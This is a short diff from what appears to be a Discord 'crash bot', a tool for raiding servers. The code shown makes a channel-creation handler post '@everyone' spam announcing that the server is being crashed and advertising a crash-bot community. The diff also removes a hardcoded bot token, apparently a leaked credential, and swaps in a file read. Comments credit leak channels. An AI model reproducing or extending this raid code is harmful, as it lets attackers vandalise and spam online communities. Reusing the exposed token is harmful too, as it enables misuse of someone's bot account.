@@ -174,7 +174,7 @@ async def on_guild_channel_create(channel):
           await webhook.send("@everyone\nДанный сервер крашиться ботом Crash By HACKER BOT\nсервер дискорд с краш ботами: https://discord.gg/vmJuq5BHtp")
         except:
           pass   
-token = 'OTEyOTk4NTY2NzY5ODc3MDEy.YZ4GLQ.Dui-2rzR03wCtjp8yb5AWHSFDsw'
+token = open("token.txt").read()
 bot.run(token)
 # слито by t.me/protectcheck
 # слито by discord.gg/fzlgroup2
